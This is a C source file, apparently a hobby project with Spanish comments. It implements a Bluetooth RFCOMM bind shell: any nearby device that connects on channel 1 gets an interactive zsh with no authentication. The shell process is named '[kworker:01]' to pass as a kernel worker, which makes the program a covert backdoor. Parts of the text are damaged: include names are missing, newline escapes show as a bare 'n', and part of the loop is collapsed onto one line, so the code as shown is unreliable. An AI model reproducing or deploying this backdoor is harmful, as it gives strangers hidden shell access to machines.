//
// Created by valentin on 12/12/19.
//

#include
#include
#include
#include
#include
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/rfcomm.h>
#include
#include <sys/select.h>
#include <sys/wait.h>
#include

#define BANNER "[+] You are connected to the device!n"

// https://people.csail.mit.edu/albert/bluez-intro/x502.html

int main (int args, char *argv[]) {
    int s, client;

    signal(SIGCHLD, SIG_IGN);
    /*
    struct sockaddr_rc {
        sa_family_t rc_family;
        bdaddr_t    rc_bdaddr;
        uint8_t     rc_channel;
    };
    */

    struct sockaddr_rc loc_addr = {0}, client_addr = {0};
    socklen_t opt = sizeof(client_addr);

    s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);

    loc_addr.rc_family = AF_BLUETOOTH;
    loc_addr.rc_bdaddr = *BDADDR_ANY; // Cualquier adaptador disponible en la máquina
    loc_addr.rc_channel = (uint8_t) 1; // Canal 1

    bind(s, (struct sockaddr *)&loc_addr, sizeof(loc_addr));
    listen(s,1);

    for(;;) {
        client = accept(s, (struct sockaddr *)&client_addr, &opt);
        printf("[+] New connection!n");

        // Escribimos un mensaje al cliente que se ha conectado
        write(client, BANNER, strlen(BANNER));
        dup2(client, 0);
        dup2(client, 1);
        dup2(client,2);

        //A partir de aquí empieza la magia
        struct termios terminal;
        int terminalfd, n = 0;
        pid_t pid;
        char input[1024];
        char output[1024];

        // Creamos un nuevo proceso hijo que operará en un pseudoterminal
        pid = forkpty(&terminalfd, NULL, NULL, NULL);

        if (pid < 0) {
            fprintf(stderr, "[-] Error: could not forkn");
            exit(EXIT_FAILURE);
        }
        else if (pid == 0) { // Estamos en el proceso hijo que tiene el PTY
            execlp("/bin/zsh", "[kworker:01]", NULL);
        }
        else { // Proceso padre
            // Atributos: sin ECHO
            tcgetattr(terminalfd, &terminal);
            terminal.c_lflag &= ~ECHO;
            tcsetattr(terminalfd, TCSANOW, &terminal);

            // Utilizaremos select para comprobar si hay datos y enviarlos en un sentido u otro
            fd_set readfd;
            for(;;) {
                FD_ZERO(&readfd);
                FD_SET(terminalfd, &readfd); // Si terminalfd tiene datos
                FD_SET(1, &readfd); // Si el socket tiene datos
                select(terminalfd + 1, &readfd, NULL, NULL, NULL);
                if (FD_ISSET(terminalfd, &readfd)) { // Hay datos desde el proceso hijo
                    n = read(terminalfd, &output, 1024);
                    if (n <= 0) { write(2, "[+] Shell is dead. Closing connection!nn", strlen("[+] Shell is dead. Closing connection!nn")); break; } write(2, output, n); // Los mandamos por el socket memset(&output, 0, 1024); } if (FD_ISSET(1, &readfd)) { // Hay datos en el socket memset(&input, 0, 1024); n = read(1, &input, 1024); if (n > 0) {
                    write(terminalfd, input, n); // Los escribimos en el STDIN del proceso hijo
                }
            }
        }


    }
}
close(client);
close(s);
return 0;
}